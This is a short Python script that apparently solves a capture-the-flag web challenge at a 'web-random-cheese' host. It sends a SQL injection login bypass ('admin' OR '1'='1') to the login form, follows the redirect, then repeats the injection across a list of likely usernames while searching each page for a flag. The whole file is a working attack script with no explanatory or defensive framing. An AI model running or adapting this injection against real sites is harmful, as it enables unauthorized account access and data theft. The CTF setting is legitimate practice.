import requests

base = 'https://web-random-cheese.tracebash.xyz'
s = requests.Session()

# Try SQL injection login
r = s.post(f'{base}/login', data={'username': "admin' OR '1'='1", 'password': "pass"}, allow_redirects=False)
print('Login response:', r.status_code)
print('Location:', r.headers.get('Location'))
print('Cookie:', s.cookies.get('session'))

# Follow redirect
if r.status_code == 302:
    r = s.get(f'{base}/')
    print('Dashboard:', r.status_code, r.text[:500])
    
# Try to access different admin usernames
for name in ['admin', 'administrator', 'root', 'tom', 'jerry', 'chef', 'owner']:
    s2 = requests.Session()
    r2 = s2.post(f'{base}/login', data={'username': f"{name}' OR '1'='1", 'password': 'x'}, allow_redirects=False)
    if r2.status_code == 302:
        r3 = s2.get(f'{base}/')
        if 'flag' in r3.text.lower():
            print(f'Found flag under {name}!')
            print(r3.text[:2000])
        elif 'h1>' in r3.text:
            print(f'Login as {name}: {r3.text[200:500]}')